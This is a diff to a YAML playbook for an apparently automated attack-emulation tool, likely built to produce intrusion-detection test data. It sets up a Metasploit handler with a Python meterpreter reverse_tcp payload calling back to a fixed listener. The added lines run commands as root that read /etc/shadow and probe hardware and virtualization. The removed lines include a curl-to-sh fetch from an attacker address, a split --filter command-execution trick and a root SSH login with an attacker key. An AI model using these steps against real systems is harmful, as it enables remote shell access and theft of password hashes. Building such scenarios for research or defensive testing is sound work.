@@ -135,15 +135,15 @@ commands:
     hostname: 192.168.100.222
     username: aecid
     password: aecid
-    jmp_hostname:  192.42.1.232
+    jmp_hostname:  192.42.2.42
     exit_on_error: False
 
   - type: msf-module
     cmd: exploit/multi/handler
     creates_session: "root"
     payload_options:
-      LHOST: 192.42.1.174
-      LPORT: 3333
+      LHOST: "192.42.1.174"
+      LPORT: "3333"
     payload: cmd/unix/python/meterpreter/reverse_tcp
 
   - type: msf-session
@@ -169,71 +169,23 @@ commands:
   - type: msf-session
     cmd: id
     session: "root"
-#
-#  - type: msf-session
-#    session: "root"
-#    cmd: "curl http://$ATTACKER_ADDRESS/README.txt.1 | sh"
-#
-#  - type: sleep
-#    seconds: 40
-#
-#  - type: msf-session
-#    cmd: id
-#    read: True
-#    session: "root"
-#
-#
-## TODO: THIS COMMAND DOES NOT WORK
-##       DON'T KNOW WHY
-##  - type: msf-session
-##    cmd: split --filter="/usr/bin/cat $FILE | /usr/bin/xargs /bin/bash -c " -C 2000 /root/README.txt
-##    session: "root"
-##
-#
-##  - type: msf-session
-##    cmd: rm /root/README.txt
-##    session: "root"
-#
-#  - type: msf-session
-#    cmd: exit
-#    session: "root"
-#
-#  - type: msf-session
-#    cmd: exit
-#    session: "root"
-#
-#  - type: sleep
-#    seconds: 30
-#
-#  - type: ssh
-#    cmd: id
-#    hostname: 192.42.0.254
-#    port: 2222
-#    username: root
-#    key_filename: "/home/aecid/.ssh/attacker_key"
-#    creates_session: "rootshell"
-#    clear_cache: True
-#
-#  - type: ssh
-#    cmd: pwd
-#    session: "rootshell"
-#
-#  - type: ssh
-#    cmd: cat /etc/shadow
-#    session: "rootshell"
-#
-#  - type: ssh
-#    cmd: lspci
-#    session: "rootshell"
-#
-#  - type: ssh
-#    cmd: command -v lsusb
-#    session: "rootshell"
-#
-#  - type: ssh
-#    cmd: date
-#    session: "rootshell"
-#
-#  - type: ssh
-#    cmd: find /usr -name \*virtualbox\*
-#    session: "rootshell"
+
+  - type: msf-session
+    cmd: cat /etc/shadow
+    session: "root"
+
+  - type: msf-session
+    cmd: lspci
+    session: "root"
+
+  - type: msf-session
+    cmd: command -v lsusb
+    session: "root"
+
+  - type: msf-session
+    cmd: date
+    session: "root"
+
+  - type: msf-session
+    cmd: find /usr -name \*virtualbox\*
+    session: "root"
